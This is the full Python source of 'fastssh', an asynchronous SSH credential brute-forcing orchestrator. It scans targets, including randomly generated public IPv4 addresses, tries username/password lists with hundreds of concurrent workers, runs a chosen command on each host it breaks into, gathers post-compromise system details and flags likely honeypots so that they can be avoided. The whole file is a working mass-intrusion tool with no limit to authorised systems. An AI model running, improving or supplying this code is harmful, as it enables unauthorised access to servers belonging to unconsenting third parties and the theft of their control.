#!/usr/bin/env python3
"""
fastssh - async SSH discovery and credential testing orchestrator.

Key ideas:
- Prefer external high-speed scanners (masscan/zmap) and ingest their JSON.
- Use async TCP probes to skip dead hosts before brute attempts.
- Async SSH auth attempts with tight concurrency and stop-after-first options.
- Structured JSONL output for easy parsing/resume.
"""

import argparse
import asyncio
import ipaddress
import json
import os
import random
import contextlib
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple

try:
    import orjson  # type: ignore
except ImportError:
    orjson = None

import asyncssh


# -----------------------------------------------------------------------------
# Data classes and helpers
# -----------------------------------------------------------------------------


@dataclass
class Config:
    targets: Dict[str, Set[int]] = field(default_factory=dict)
    combos: List[Tuple[str, str]] = field(default_factory=list)
    target_state: Dict[str, int] = field(default_factory=dict)
    target_state_path: Optional[Path] = None
    resume_targets: bool = True
    connect_timeout: float = 3.0
    auth_timeout: float = 5.0
    read_timeout: float = 3.0
    max_workers: int = 200
    queue_size: int = 10000
    stop_first_host: bool = False
    stop_first_global: bool = False
    command: Optional[str] = None
    command_output: bool = True
    capture_banner: bool = False
    probe: bool = True
    shuffle: bool = True
    results_path: Path = Path("results.jsonl")
    log_interval: float = 5.0
    hang_timeout: float = 60.0  # seconds with no progress before declaring hang (0 disables)
    verbose: bool = False
    require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled
    gather_info: bool = False
    honeypot_detect: bool = True
    post_timeout: float = 5.0  # seconds budget for post-compromise info gathering
    age_cache: Optional[Path] = None
    require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled


@dataclass
class WorkItem:
    host: str
    port: int
    user: str
    password: str


@dataclass
class HostState:
    stop: asyncio.Event = field(default_factory=asyncio.Event)
    banner: Optional[str] = None


def load_lines(path: Path) -> List[str]:
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except OSError as exc:
        raise SystemExit(f"Failed to read {path}: {exc}") from exc


def parse_target(line: str, default_port: int = 22) -> Tuple[str, List[int]]:
    host = line.strip()
    if not host:
        return "", []
    if ":" in host:
        base, ports_raw = host.split(":", 1)
        ports = [int(p) for p in ports_raw.split(",") if p]
        ports = ports or [default_port]
        return base, ports
    return host, [default_port]


def load_target_state(path: Optional[Path]) -> Dict[str, int]:
    if not path:
        return {}
    try:
        data = json.loads(path.read_text())
        if isinstance(data, dict):
            return {str(k): int(v) for k, v in data.items()}
    except Exception:
        pass
    return {}


def save_target_state(path: Optional[Path], state: Dict[str, int]) -> None:
    if not path:
        return
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(state))
    except Exception as exc:
        print(f"[warn] failed to write target state {path}: {exc}", flush=True)


def collect_targets(
    args: argparse.Namespace,
    target_state: Dict[str, int],
    resume: bool,
    chunk: Optional[int],
) -> Tuple[Dict[str, Set[int]], Dict[str, int]]:
    targets: Dict[str, Set[int]] = {}
    new_state = dict(target_state)

    def add_target(host: str, ports: Iterable[int]) -> None:
        if not host:
            return
        targets.setdefault(host, set()).update(ports)

    def announce_resume(src: str, start: int, total: int) -> None:
        if resume and total > 0 and start > 0:
            print(f"[resume] {src}: starting at {start}/{total}", flush=True)

    # Inline targets
    for t in args.target or []:
        host, ports = parse_target(t, args.port)
        add_target(host, ports)

    # File-based targets (with optional resume/chunk)
    if args.targets:
        path = Path(args.targets)
        lines = load_lines(path)
        total = len(lines)
        start = new_state.get(str(path), 0) if resume else 0
        if start >= total:
            start = 0
        end = start + chunk if chunk else total
        announce_resume(str(path), start, total)
        slice_lines = lines[start:end]
        for line in slice_lines:
            host, ports = parse_target(line, args.port)
            add_target(host, ports)
        if total > 0 and resume:
            new_offset = end if end < total else 0
            new_state[str(path)] = new_offset

    # masscan JSON ingestion
    if args.masscan_json:
        try:
            data = json.loads(Path(args.masscan_json).read_text())
        except (OSError, json.JSONDecodeError) as exc:
            raise SystemExit(f"Failed to load masscan JSON: {exc}") from exc
        if isinstance(data, dict):
            data = [data]
        key = f"{Path(args.masscan_json)}#masscan"
        total = len(data)
        start = new_state.get(key, 0) if resume else 0
        if start >= total:
            start = 0
        end = start + chunk if chunk else total
        announce_resume(key, start, total)
        slice_data = data[start:end]
        for entry in slice_data:
            ip = entry.get("ip")
            for port_info in entry.get("ports", []):
                if port_info.get("status") != "open":
                    continue
                add_target(ip, [int(port_info.get("port", args.port))])
        if total > 0 and resume:
            new_offset = end if end < total else 0
            new_state[key] = new_offset

    # Random public IPv4 generation
    for _ in range(args.random or 0):
        ip = ipaddress.ip_address(".".join(str(random.randint(0, 255)) for _ in range(4)))
        if ip.is_private or ip.is_loopback or ip.is_multicast:
            continue
        add_target(str(ip), [args.port])

    if not targets:
        raise SystemExit("No targets provided.")

    return targets, new_state


def load_creds(args: argparse.Namespace) -> List[Tuple[str, str]]:
    combos: Set[Tuple[str, str]] = set()

    # combo file: user:pass per line
    if args.combo_file:
        for line in load_lines(Path(args.combo_file)):
            if ":" not in line:
                continue
            user, pwd = line.split(":", 1)
            combos.add((user, pwd))

    users: List[str] = []
    passwords: List[str] = []

    if args.user_file:
        users.extend(load_lines(Path(args.user_file)))
    if args.users:
        users.extend(args.users)
    if not users:
        users = ["root"]

    if args.pass_file:
        passwords.extend(load_lines(Path(args.pass_file)))
    if args.passwords:
        passwords.extend(args.passwords)
    if not passwords and not combos:
        passwords = ["root"]

    if not combos:
        for u in users:
            for p in passwords:
                combos.add((u, p))

    return list(combos)


def dumps_json(record: dict) -> str:
    if orjson:
        return orjson.dumps(record).decode()
    return json.dumps(record, ensure_ascii=False)


def now_ts() -> float:
    return time.time()


def load_age_cache(path: Optional[Path]) -> Dict[str, float]:
    if not path:
        return {}
    try:
        data = json.loads(path.read_text())
        if isinstance(data, dict):
            return {str(k): float(v) for k, v in data.items()}
    except Exception:
        pass
    return {}


def save_age_cache(path: Optional[Path], cache: Dict[str, float]) -> None:
    if not path:
        return
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(cache))
    except Exception as exc:
        print(f"[warn] failed to write age cache {path}: {exc}", flush=True)


# -----------------------------------------------------------------------------
# Networking helpers
# -----------------------------------------------------------------------------


async def probe_port(host: str, port: int, timeout: float) -> Optional[str]:
    """
    TCP probe to check reachability and optionally grab the SSH banner.
    """
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
        banner = None
        try:
            banner = await asyncio.wait_for(reader.read(128), timeout=timeout)
            banner = banner.decode(errors="ignore").strip()
        except Exception:
            banner = None
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
        return banner
    except Exception:
        return None


# -----------------------------------------------------------------------------
# Post-compromise enrichment
# -----------------------------------------------------------------------------


def summarize_health(load_1: float, cores: int, mem_free: int, mem_total: int, disk_free: int, disk_total: int) -> Dict[str, Any]:
    reasons = []
    status = "good"
    if cores > 0 and load_1 > cores * 2:
        reasons.append(f"high load ({load_1} on {cores} cores)")
    if mem_total > 0:
        mem_free_pct = (mem_free / mem_total) * 100
        if mem_free_pct < 5:
            reasons.append(f"low memory ({mem_free_pct:.1f}% free)")
    if disk_total > 0:
        disk_free_pct = (disk_free / disk_total) * 100
        if disk_free_pct < 5:
            reasons.append(f"low disk ({disk_free_pct:.1f}% free)")
    if reasons:
        status = "warn"
    return {"status": status, "reasons": reasons}


async def run_cmd(conn: asyncssh.SSHClientConnection, cmd: str, timeout: float) -> Dict[str, Any]:
    try:
        res = await asyncio.wait_for(conn.run(cmd, check=False), timeout=timeout)
        return {
            "ok": res.exit_status == 0,
            "stdout": res.stdout,
            "stderr": res.stderr,
            "exit_status": res.exit_status,
        }
    except Exception as exc:
        return {"ok": False, "stdout": "", "stderr": str(exc), "exit_status": -1}


async def gather_info(
    conn: asyncssh.SSHClientConnection,
    cfg: Config,
    host_state: HostState,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
) -> Dict[str, Any]:
    async def do() -> Dict[str, Any]:
        info: Dict[str, Any] = {}
        ssh_info: Dict[str, Any] = {}

        host_key = conn.get_server_host_key()
        if host_key:
            ssh_info["hostkey_fingerprint"] = host_key.get_fingerprint()
            async with state_lock:
                cache = state.setdefault("age_cache", {})
                current_ts = now_ts()
                first_seen = cache.get(ssh_info["hostkey_fingerprint"])
                if not first_seen:
                    first_seen = current_ts
                    cache[ssh_info["hostkey_fingerprint"]] = first_seen
                ssh_info["first_seen"] = first_seen
                ssh_info["seen_before"] = first_seen < current_ts

        if host_state.banner:
            ssh_info["banner"] = host_state.banner
        info["ssh"] = ssh_info

        sysinfo_cmds = {
            "uname": "uname -a",
            "os_release": "cat /etc/os-release",
            "load": "cat /proc/loadavg",
            "mem": "cat /proc/meminfo",
            "disk": "df -P /",
            "uptime": "cat /proc/uptime",
            "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
            "nproc": "nproc",
        }

        cmd_results: Dict[str, Any] = {}
        lost = False
        for key, cmd in sysinfo_cmds.items():
            res = await run_cmd(conn, cmd, timeout=cfg.read_timeout)
            cmd_results[key] = res
            stderr_lower = res.get("stderr", "").lower()
            if any(term in stderr_lower for term in ["connection lost", "connection closed", "channel closed", "connection reset"]):
                lost = True
                break
        info["commands"] = cmd_results

        try:
            lines = [l.strip() for l in cmd_results.get("id", {}).get("stdout", "").splitlines() if l.strip()]
            uid = int(lines[0]) if lines else None
            user = lines[1] if len(lines) > 1 else None
            root_writable = any("root_writable" in l for l in lines)
            info["access"] = {"uid": uid, "user": user, "root_writable": root_writable}
        except Exception:
            info["access"] = {"error": "parse_failed"}

        # Basic parsing
        try:
            load_parts = cmd_results.get("load", {}).get("stdout", "").split()
            load_1 = float(load_parts[0]) if load_parts else 0.0
        except Exception:
            load_1 = 0.0
        try:
            meminfo = cmd_results.get("mem", {}).get("stdout", "")
            mem_total = mem_free = 0
            for line in meminfo.splitlines():
                if line.startswith("MemTotal:"):
                    mem_total = int(line.split()[1])
                elif line.startswith("MemAvailable:"):
                    mem_free = int(line.split()[1])
            info["memory_kb"] = {"total": mem_total, "free": mem_free}
        except Exception:
            mem_total = mem_free = 0

        disk_total = disk_free = 0
        try:
            lines = cmd_results.get("disk", {}).get("stdout", "").splitlines()
            if len(lines) >= 2:
                parts = lines[1].split()
                if len(parts) >= 4:
                    disk_total = int(parts[1])
                    disk_free = int(parts[3])
        except Exception:
            pass

        try:
            cores = int(cmd_results.get("nproc", {}).get("stdout", "").strip().splitlines()[0])
        except Exception:
            cores = 1
        info["health"] = summarize_health(load_1, cores, mem_free, mem_total, disk_free, disk_total)

        if cfg.honeypot_detect:
            hp_reasons = []
            banner = host_state.banner or ssh_info.get("banner", "")
            if banner and any(x in banner.lower() for x in ["cowrie", "kippo", "dionaea"]):
                hp_reasons.append("honeypot-like banner")
            uptime_out = cmd_results.get("uptime", {}).get("stdout", "")
            try:
                uptime_secs = float(uptime_out.split()[0])
                if uptime_secs < 300 and banner and "openssh" in banner.lower():
                    hp_reasons.append("very low uptime with normal banner")
            except Exception:
                pass
            id_exit = cmd_results.get("id", {}).get("exit_status")
            if not lost and id_exit not in (0, None):
                hp_reasons.append("basic command failures")
            if lost:
                hp_reasons.append("connection lost during info collection")
            info["honeypot"] = {"suspect": bool(hp_reasons), "reasons": hp_reasons}

        if lost:
            info["post_error"] = "connection_lost"

        return info

    try:
        return await asyncio.wait_for(do(), timeout=cfg.post_timeout)
    except asyncio.TimeoutError:
        return {"error": "post_timeout"}
    except Exception as exc:
        return {"error": str(exc)}


# -----------------------------------------------------------------------------
# Brute engine
# -----------------------------------------------------------------------------


async def attempt_login(
    item: WorkItem,
    cfg: Config,
    host_state: HostState,
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
) -> None:
    if global_stop.is_set() or host_state.stop.is_set():
        return

    try:
        conn = await asyncssh.connect(
            item.host,
            port=item.port,
            username=item.user,
            password=item.password,
            known_hosts=None,
            client_keys=[],
            login_timeout=cfg.auth_timeout,
            connect_timeout=cfg.connect_timeout,
            compression_algs=["none"],
        )
    except (asyncssh.PermissionDenied, asyncssh.misc.DisconnectError, asyncio.TimeoutError) as exc:
        async with stats_lock:
            stats["failures"] += 1
            stats["last_progress"] = time.monotonic()
        if cfg.verbose:
            print(f"[warn] auth failed {item.host}:{item.port} {item.user}:{item.password} ({exc})", flush=True)
        return
    except OSError as exc:
        async with stats_lock:
            stats["failures"] += 1
            stats["last_progress"] = time.monotonic()
        if cfg.verbose:
            print(f"[warn] connection error {item.host}:{item.port} ({exc})", flush=True)
        return
    except Exception as exc:
        async with stats_lock:
            stats["errors"] += 1
            stats["last_progress"] = time.monotonic()
        print(f"[error] unexpected error before auth {item.host}:{item.port}: {exc}", flush=True)
        return

    async with conn:
        # Sanity check that we can actually run a trivial command; if not, treat as failure.
        try:
            sanity = await asyncio.wait_for(conn.run("echo fastssh_ok", check=False), timeout=cfg.read_timeout)
            if sanity.exit_status != 0:
                raise RuntimeError(f"sanity command exit {sanity.exit_status}")
        except Exception as exc:
            async with stats_lock:
                stats["failures"] += 1
                stats["last_progress"] = time.monotonic()
            if cfg.verbose:
                print(f"[warn] session unusable after auth {item.host}:{item.port}: {exc}", flush=True)
            return

        record = {
            "host": item.host,
            "port": item.port,
            "user": item.user,
            "password": item.password,
        }

        if cfg.command:
            try:
                result = await asyncio.wait_for(conn.run(cfg.command, check=False), timeout=cfg.read_timeout)
                if cfg.command_output:
                    record["command"] = cfg.command
                    record["stdout"] = result.stdout
                    record["stderr"] = result.stderr
            except Exception as exc:
                record["command"] = cfg.command
                record["stdout"] = ""
                record["stderr"] = f"<command error: {exc}>"

        if host_state.banner:
            record["banner"] = host_state.banner

        if cfg.gather_info:
            extra = await gather_info(conn, cfg, host_state, state, state_lock)
            record.update(extra)

        async with file_lock:
            cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
            with cfg.results_path.open("a", encoding="utf-8") as f:
                f.write(dumps_json(record) + "\n")

        async with stats_lock:
            stats["successes"] += 1
            stats["last_progress"] = time.monotonic()

        if cfg.stop_first_host:
            host_state.stop.set()
        if cfg.stop_first_global:
            global_stop.set()


async def worker(
    queue: "asyncio.Queue[Optional[WorkItem]]",
    cfg: Config,
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            return

        if global_stop.is_set() or host_states[item.host].stop.is_set():
            async with stats_lock:
                stats["skipped"] += 1
                stats["last_progress"] = time.monotonic()
            queue.task_done()
            continue

        async with stats_lock:
            stats["active"] += 1
        try:
            await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats, stats_lock, state, state_lock)
        except Exception as exc:
            async with stats_lock:
                stats["errors"] += 1
                stats["last_progress"] = time.monotonic()
            print(f"[error] worker crash avoided for {item.host}:{item.port}: {exc}", flush=True)
        finally:
            async with stats_lock:
                stats["active"] = max(0, stats["active"] - 1)
                stats["attempts"] += 1
                stats["last_progress"] = time.monotonic()
            queue.task_done()


# -----------------------------------------------------------------------------
# Orchestration
# -----------------------------------------------------------------------------


async def build_queue(
    cfg: Config,
    queue: "asyncio.Queue[Optional[WorkItem]]",
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
) -> None:
    hosts = list(cfg.targets.items())
    combos = list(cfg.combos)
    if cfg.shuffle:
        random.shuffle(hosts)
        random.shuffle(combos)

    try:
        for host, ports in hosts:
            host_states.setdefault(host, HostState())
            port_list = list(ports)
            if cfg.shuffle:
                random.shuffle(port_list)
            for port in port_list:
                for user, pwd in combos:
                    if global_stop.is_set():
                        break
                    await queue.put(WorkItem(host, port, user, pwd))
    finally:
        for _ in range(cfg.max_workers):
            await queue.put(None)


async def probe_targets(cfg: Config, host_states: Dict[str, HostState]) -> None:
    if not cfg.probe:
        return
    print("[info] Probing targets...", flush=True)
    filtered: Dict[str, Set[int]] = {}
    tasks = []
    for host, ports in cfg.targets.items():
        for port in ports:
            tasks.append((host, port))

    sem = asyncio.Semaphore(cfg.max_workers)
    results: Dict[Tuple[str, int], Optional[str]] = {}
    probe_stats = {"done": 0, "live": 0, "ssh": 0, "total": len(tasks)}
    status_lock = asyncio.Lock()

    def render_status() -> str:
        return (
            f"\r[probe] {probe_stats['done']}/{probe_stats['total']} checked | "
            f"live: {probe_stats['live']} | ssh: {probe_stats['ssh']}"
        )

    async def one(host: str, port: int) -> None:
        async with sem:
            banner = await probe_port(host, port, cfg.connect_timeout)
            results[(host, port)] = banner
            is_live = banner is not None
            is_ssh = bool(banner) and banner.startswith("SSH-")
            async with status_lock:
                probe_stats["done"] += 1
                if is_live:
                    probe_stats["live"] += 1
                if is_ssh:
                    probe_stats["ssh"] += 1
                print(render_status(), end="", flush=True)

    await asyncio.gather(*(one(h, p) for h, p in tasks))
    print()  # newline after live status

    for (host, port), banner in results.items():
        if banner is not None:
            if cfg.require_ssh_banner and (not banner or not banner.startswith("SSH-")):
                continue
            filtered.setdefault(host, set()).add(port)
            if cfg.capture_banner:
                host_states.setdefault(host, HostState()).banner = banner

    cfg.targets = filtered
    if not cfg.targets:
        raise SystemExit("No live SSH targets after probing.")
    print(f"[info] Probe complete. Live hosts: {len(cfg.targets)}", flush=True)


def count_work_items(cfg: Config) -> int:
    return sum(len(ports) * len(cfg.combos) for ports in cfg.targets.values())


def drain_queue(queue: "asyncio.Queue[Optional[WorkItem]]") -> None:
    # Best-effort empty to accelerate shutdown on hang/stop.
    try:
        while True:
            item = queue.get_nowait()
            queue.task_done()
            if item is None:
                queue.put_nowait(item)
    except asyncio.QueueEmpty:
        return


async def progress_reporter(
    cfg: Config,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    queue: "asyncio.Queue[Optional[WorkItem]]",
    stop: asyncio.Event,
    global_stop: asyncio.Event,
) -> None:
    start_time = time.monotonic()

    async def snapshot(now: float) -> str:
        async with stats_lock:
            attempts = int(stats.get("attempts", 0))
            successes = int(stats.get("successes", 0))
            failures = int(stats.get("failures", 0))
            errors = int(stats.get("errors", 0))
            skipped = int(stats.get("skipped", 0))
            active = int(stats.get("active", 0))
            total = int(stats.get("total", 0))
            last_progress = stats.get("last_progress", start_time)
        elapsed = now - start_time
        idle = now - last_progress if last_progress else 0.0
        done = attempts + skipped
        pending = max(total - done, 0)
        rate = attempts / elapsed if elapsed > 0 else 0.0
        success_rate = successes / attempts if attempts else 0.0
        qsize = queue.qsize()
        lines = [
            "[status]",
            f"  elapsed: {elapsed:.1f}s | rate: {rate:.2f}/s | idle: {idle:.1f}s",
            f"  queue: {qsize} | pending-est: {pending} | active: {active}/{cfg.max_workers}",
            f"  attempts: {attempts}/{total} | successes: {successes} | failures: {failures} | skipped: {skipped} | errors: {errors}",
            f"  success-rate: {success_rate:.2%}",
        ]
        return "\n".join(lines)

    # Print immediately so users see status even before the first interval elapses.
    print(await snapshot(time.monotonic()), flush=True)

    while not stop.is_set():
        await asyncio.sleep(cfg.log_interval)
        now = time.monotonic()
        print(await snapshot(now), flush=True)

        async with stats_lock:
            idle = now - stats.get("last_progress", start_time)
            pending_now = max(stats.get("total", 0) - (stats.get("attempts", 0) + stats.get("skipped", 0)), 0)
        if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending_now > 0:
            print(
                f"[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.",
                flush=True,
            )
            stop.set()
            global_stop.set()
            drain_queue(queue)


async def run(cfg: Config) -> None:
    host_states: Dict[str, HostState] = {}
    await probe_targets(cfg, host_states)

    queue_size = max(0, cfg.queue_size)
    queue: "asyncio.Queue[Optional[WorkItem]]" = asyncio.Queue(maxsize=queue_size)
    global_stop = asyncio.Event()
    file_lock = asyncio.Lock()
    stats_lock = asyncio.Lock()
    state_lock = asyncio.Lock()
    state: Dict[str, Any] = {"age_cache": load_age_cache(cfg.age_cache)}
    stats: Dict[str, float] = {
        "attempts": 0,
        "successes": 0,
        "failures": 0,
        "skipped": 0,
        "errors": 0,
        "active": 0,
        "total": count_work_items(cfg),
        "last_progress": time.monotonic(),
    }

    workers = [
        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats, stats_lock, state, state_lock))
        for _ in range(cfg.max_workers)
    ]
    reporter_stop = asyncio.Event()
    reporter = asyncio.create_task(progress_reporter(cfg, stats, stats_lock, queue, reporter_stop, global_stop))

    print("[info] Building work queue...", flush=True)
    await build_queue(cfg, queue, host_states, global_stop)
    print("[info] Work queue built, processing...", flush=True)
    try:
        await queue.join()
    except KeyboardInterrupt:
        print("\n[info] Interrupt received, shutting down gracefully...", flush=True)
    finally:
        global_stop.set()
        reporter_stop.set()
        await reporter
        for w in workers:
            w.cancel()
        with contextlib.suppress(Exception):
            await asyncio.gather(*workers)
        with contextlib.suppress(Exception):
            save_age_cache(cfg.age_cache, state.get("age_cache", {}))
        with contextlib.suppress(Exception):
            save_target_state(cfg.target_state_path, cfg.target_state)


# -----------------------------------------------------------------------------
# CLI
# -----------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="fast SSH credential testing orchestrator")
    p.add_argument("--target", action="append", help="host or host:ports (comma-separated)")
    p.add_argument("--targets", help="file with host[:ports] per line")
    p.add_argument("--targets-chunk", type=int, help="limit to N target lines from file (after resume offset)")
    p.add_argument("--targets-state", help="path to targets resume state (json)")
    p.add_argument("--no-resume", action="store_true", help="disable auto-resume for targets file")
    p.add_argument("--profile", choices=["fast", "balanced", "info"], help="apply preset tuning (overrides defaults unless manually set)")
    p.add_argument("--masscan-json", help="masscan JSON output to ingest")
    p.add_argument("--random", type=int, default=0, help="generate N random public IPv4s")
    p.add_argument("--port", type=int, default=22, help="default port when none given")

    p.add_argument("--users", nargs="+", help="usernames")
    p.add_argument("--user-file", help="file with usernames")
    p.add_argument("--passwords", nargs="+", help="passwords")
    p.add_argument("--pass-file", help="file with passwords")
    p.add_argument("--combo-file", help="file with user:pass per line")

    p.add_argument("--max-workers", type=int, default=200, help="parallel SSH attempts")
    p.add_argument("--queue-size", type=int, default=10000, help="max queued attempts")
    p.add_argument("--connect-timeout", type=float, default=3.0)
    p.add_argument("--auth-timeout", type=float, default=5.0)
    p.add_argument("--read-timeout", type=float, default=3.0)
    p.add_argument("--log-interval", type=float, default=5.0, help="seconds between progress prints")
    p.add_argument("--hang-timeout", type=float, default=60.0, help="seconds with no progress before hang stop (0 to disable)")

    p.add_argument("--command", help="run this command on success")
    p.add_argument("--no-command-output", action="store_true", help="suppress command stdout/stderr in logs")
    p.add_argument("--stop-first-host", action="store_true", help="stop attacking a host after first success")
    p.add_argument("--stop-first-global", action="store_true", help="stop all work after first success")
    p.add_argument("--no-probe", action="store_true", help="skip TCP probe step")
    p.add_argument("--banner", action="store_true", help="capture SSH banner during probe")
    p.add_argument("--no-shuffle", action="store_true", help="disable randomization of attempts")
    p.add_argument("--results", default="results.jsonl", help="path to JSONL output")
    p.add_argument("--verbose", action="store_true", help="print per-attempt warnings/errors")
    p.add_argument("--allow-non-ssh", action="store_true", help="include non-SSH listeners detected during probe")
    p.add_argument("--gather-info", action="store_true", help="collect system info on successful auth")
    p.add_argument("--no-honeypot-detect", action="store_true", help="disable honeypot heuristics")
    p.add_argument("--post-timeout", type=float, default=5.0, help="timeout budget for post-auth info collection")
    p.add_argument("--age-cache", help="path to hostkey first-seen cache (json)")
    # Note: a short sanity command runs after auth to ensure the session can execute commands; failures are treated as auth failures.
    return p


def main(argv: Optional[Sequence[str]] = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)

    def apply_profile() -> None:
        if not args.profile:
            return
        profiles = {
            "fast": {
                "max_workers": 400,
                "queue_size": 0,
                "connect_timeout": 1.5,
                "auth_timeout": 3.0,
                "read_timeout": 2.0,
                "log_interval": 3.0,
                "hang_timeout": 45.0,
                "gather_info": False,
            },
            "balanced": {
                "max_workers": 250,
                "queue_size": 0,
                "connect_timeout": 2.0,
                "auth_timeout": 4.0,
                "read_timeout": 3.0,
                "log_interval": 4.0,
                "hang_timeout": 60.0,
            },
            "info": {
                "max_workers": 200,
                "queue_size": 0,
                "connect_timeout": 2.5,
                "auth_timeout": 5.0,
                "read_timeout": 4.0,
                "log_interval": 5.0,
                "hang_timeout": 90.0,
                "gather_info": True,
                "post_timeout": 6.0,
            },
        }
        profile_vals = profiles.get(args.profile, {})
        for key, val in profile_vals.items():
            default_val = parser.get_default(key)
            if getattr(args, key, None) == default_val:
                setattr(args, key, val)

    apply_profile()

    results_target = args.results
    if not results_target or results_target == "results.jsonl":
        results_target = f"results-{int(time.time())}.jsonl"
    results_path = Path(results_target)
    age_cache_path = Path(args.age_cache) if args.age_cache else (Path("age-cache.json") if args.gather_info else None)
    target_state_path = None
    if args.targets_state:
        target_state_path = Path(args.targets_state)
    elif args.targets or args.masscan_json:
        target_state_path = Path("targets-state.json")
    target_state = load_target_state(target_state_path)

    targets, new_target_state = collect_targets(
        args,
        target_state=target_state,
        resume=not args.no_resume,
        chunk=args.targets_chunk,
    )

    cfg = Config(
        targets=targets,
        target_state=new_target_state,
        target_state_path=target_state_path,
        combos=load_creds(args),
        connect_timeout=args.connect_timeout,
        auth_timeout=args.auth_timeout,
        read_timeout=args.read_timeout,
        max_workers=args.max_workers,
        queue_size=args.queue_size,
        stop_first_host=args.stop_first_host,
        stop_first_global=args.stop_first_global,
        command=args.command,
        command_output=not args.no_command_output,
        capture_banner=args.banner,
        probe=not args.no_probe,
        shuffle=not args.no_shuffle,
        results_path=results_path,
        log_interval=args.log_interval,
        hang_timeout=args.hang_timeout,
        verbose=args.verbose,
        require_ssh_banner=not args.allow_non_ssh,
        gather_info=args.gather_info,
        honeypot_detect=not args.no_honeypot_detect,
        post_timeout=args.post_timeout,
        age_cache=age_cache_path,
    )

    try:
        asyncio.run(run(cfg))
    except KeyboardInterrupt:
        print("Interrupted, exiting.")
    except Exception as exc:
        print(f"[fatal] Unhandled error: {exc}")


if __name__ == "__main__":
    main()
